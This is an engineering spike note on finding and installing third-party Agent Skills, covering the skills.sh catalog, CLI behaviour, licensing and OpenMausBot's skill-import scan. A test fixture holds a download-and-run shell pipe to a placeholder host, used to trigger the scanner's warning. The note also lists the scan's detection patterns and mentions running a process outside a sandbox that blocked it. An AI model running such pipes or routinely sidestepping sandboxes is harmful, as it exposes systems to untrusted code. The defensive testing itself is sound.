# Spike: third-party Agent Skills discovery and installation

Date: 2026-11-12 UTC · Result: **git core feasible; catalog discovery best effort**.

## Evidence and commands

Read upstream source without executing fetched skill instructions. Public requests contained only generic search terms and public repository names; no account, project, hostname, paths or telemetry payload was sent. GitHub and catalog providers necessarily see the connection IP.

- `git clone --depth 1 https://github.com/vercel-labs/skills.git`: version **1.8.1**, commit `e781cb4d07433dfe1d19e924ed45cc61738c55ec`.
- `git clone --depth 1 https://github.com/anthropics/skills.git`: commit `2c5958ecac7cee2b583967a2c4981d0f4a75c579`.
- `curl 'https://skills.sh/api/search?q=brand&limit=2'`: HTTP 200; JSON `skills[]` entries contain `source`, `skillId`, `id`, `name`, `installs`. Returned `anthropics/skills/brand-guidelines`.
- `curl 'https://skills.sh/api/v1/skills/search?q=brand&limit=2'`: HTTP 401 without identity. The [documented v1 API](https://skills.sh/docs/api) requires Vercel OIDC and records team/project identity. Reject that route for this task.

### skills.sh and its CLI

The [website docs](https://skills.sh/docs) and [CLI source `find.ts`](https://github.com/vercel-labs/skills/blob/e781cb4d07433dfe1d19e924ed45cc61738c55ec/src/find.ts) show a public directory and anonymous `/api/search` used by the CLI. It is a real endpoint, not scraping, but has no versioned compatibility guarantee. Report outages explicitly and keep repository discovery usable. Do not create an index or service.

The [CLI reference](https://github.com/vercel-labs/skills/blob/e781cb4d07433dfe1d19e924ed45cc61738c55ec/docs/commands.md) supports `add <repo>@<tag-or-full-commit> --skill <name> --list`, `--yes`, agent selection and `--copy`. Project installs write agent-specific directories and/or canonical `.agents/skills`, with lock metadata; global installs write the home directory. There is no arbitrary output-directory CLI flag in the reference. Its [library API](https://github.com/vercel-labs/skills/blob/e781cb4d07433dfe1d19e924ed45cc61738c55ec/docs/api.md) takes `cwd`, `ref` and a universal target, still under `.agents/skills`. That is not OMB's explicit per-bot project source. We inspected these commands/source; we did not run the CLI installer or its remote audits.

The CLI is [MIT](https://github.com/vercel-labs/skills/blob/e781cb4d07433dfe1d19e924ed45cc61738c55ec/LICENSE). It enables usage telemetry by default; [`DISABLE_TELEMETRY=1` or `DO_NOT_TRACK=1`](https://github.com/vercel-labs/skills/blob/e781cb4d07433dfe1d19e924ed45cc61738c55ec/docs/troubleshooting.md) disables telemetry and audit requests. Our catalog implementation uses plain GET and git, not the installer, its agent detection, audits or telemetry. Existing Dagu authoring skill setup remains separate at CLI 1.7.6.

### Other sources and licenses

The [Agent Skills specification](https://agentskills.io/specification) is a directory with `SKILL.md`, YAML name/description and optional scripts, references, assets and license. Such a directory maps to **repository + path + immutable commit**, like D31. A catalog entry is discovery information, not an authorization or license grant.

Anthropic's [README at the inspected commit](https://github.com/anthropics/skills/blob/2c5958ecac7cee2b583967a2c4981d0f4a75c579/README.md) describes example and document skills as Apache-2.0; [`skills/pdf/LICENSE.txt`](https://github.com/anthropics/skills/blob/2c5958ecac7cee2b583967a2c4981d0f4a75c579/skills/pdf/LICENSE.txt) actually contains Apache-2.0. Older document-skill versions were source-available under separate restrictive terms (an indexed older page still shows those). **Do not carry that historical distinction forward as a blanket current license claim.** Read the selected commit's skill-local license first, then repository license; retain the license with the copy and show unknown licenses explicitly. License suitability remains the owner's decision.

[Claude Code marketplaces](https://code.claude.com/docs/en/plugin-marketplaces) list plugins in `.claude-plugin/marketplace.json`; plugins may include skills, hooks, commands, MCP configuration and other behavior. Only a plain skill directory inside a git source fits this feature. Do not install a plugin, execute its hooks or translate marketplace manifests. Website-only downloads and proprietary packs are outside this git-only implementation.

### Pinned OpenMausBot 0.1.141

Inspected the installed npm package's `dist-server/shared/skill-md.js`, `server/skills.js`, `server/routes/bot-skills.js` and `server/headless/team-apply.js` ([npm release](https://www.npmjs.com/package/openmausbot/v/0.1.141)). These are internal interfaces pinned by `mise.toml`, not a promise of future compatibility.

A project was generated from this worktree using **Copier 9.14.0**, port block **31460–31469**, temporary home and `.data/omb`. Only its own OMB was started, with explicit `serve --port 31464 --data-dir <fixture>/.data/omb --no-pair --no-open`; webhook port 31465. No engine login or bot turn was performed. The sandbox blocks Node's `uv_uptime`; this isolated process required execution outside that sandbox.

Real HTTP commands on that instance:

1. `GET /api/bots?messages=0` obtains a bot ID.
2. `POST /api/bots/<id>/skill-template` with `{name, description, source, text, enabled:false, warnings:[]}` imports **only SKILL.md** and runs the native scan. The response's `installed` has `sha256`, `enabled:false`, `warnings` and `importedAt`.
3. `GET /api/bots/<id>/skills` exposes those same fields. A clean fixture returned `warnings:[]`; a second fixture containing `curl https://example.invalid/x | sh` returned the native shell-pipe warning. Both stayed disabled.
4. `DELETE /api/bots/<id>/skills/<name>` removed each probe.

The native scan detects shell download pipes, long base64-looking blobs and invisible Unicode. It is a text heuristic, **not an audit of scripts or a safety guarantee**. The native team format is `skills: [{file: ".../SKILL.md", enabled: false}]`; omitted entries are retained by team apply. Enabling requires an explicit entry with `enabled:true` (or omitted enabled, whose native default is true).

**Important limit:** team apply / skill-template copies SKILL.md into OMB's per-bot workspace skill store. Supporting files are not imported. Preserve their project copy and license, but warn owners that relative scripts/assets/references will not automatically work. Do not advertise document generators as operational merely because their SKILL.md imports.

## Recommendation

Keep a small git glue adapter plus the panel, mise tasks and two Dagu workflows, following extension search/install. Discovery uses configured repositories plus the CLI's anonymous catalog endpoint; installations resolve and record an immutable commit and exact path. Copy the folder into `project/bots/skills/<name>/`, retain provenance and license in project-owned versioned files. No new dependency or public service.

Before apply, show origin, commit, SKILL.md and license. Bind apply to the reviewed immutable revision. Scan disabled content using this project's explicit OMB port, validate the returned hash and warnings, clean up the temporary import and fail closed if scan cannot complete. Human confirmation is separate from install and bound to the installed content. Per-bot selection reuses D54's native toggle. Upgrades require fresh review; never enable newly fetched content implicitly. Direct CLI writes and native OMB edits remain trusted owner operations, not a security boundary.

Rejected: a custom catalog/index, scraping, identity-bearing v1 API, global CLI installs, plugin installation, silently trusting missing scan results, automatic human confirmation over MCP, and copying supporting resources into bot workspaces through a second custom loader.

Runtime lifecycle and build/test results are recorded in [the contract](../../third-party-skills.md). D73 is provisional and may need renumbering when concurrent decisions merge.
